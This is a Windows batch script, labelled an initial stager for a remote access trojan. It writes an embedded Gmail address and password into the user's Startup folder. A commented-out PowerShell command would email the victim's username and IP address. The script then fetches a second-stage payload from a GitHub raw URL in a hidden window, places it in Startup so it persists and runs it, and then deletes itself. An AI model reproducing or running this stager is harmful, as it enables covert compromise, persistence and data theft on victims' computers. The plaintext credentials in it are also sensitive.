@echo off
@REM initial stager for RAT
@REM created by: Petros

@REM credentials
set email_uname="websitepetros@gmail.com"
set email_pword="Peter1234!@#$"

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into the startup folder
cd "%STARTUP%"
echo %email_uname% > email.txt
echo %email_pword% > pass.txt


@REM setup smtp
@REM powershell Send-MailMessage -From %email_uname% -To %email_uname% -subject "$env:UserName" -Body (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList %email_uname%, (ConvertTo-SecureString -String %email_pword% -AsPlainText -Force))


@REM write payloads to startup
powershell powershell.exe -windowstyle hidden  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/stage1.cmd -OutFile stage1.cmd"

@REM run payload  
powershell ./stage1.cmd

@REM cd back to the initial directory
cd "%INITIALPATH%"
del initial.cmd
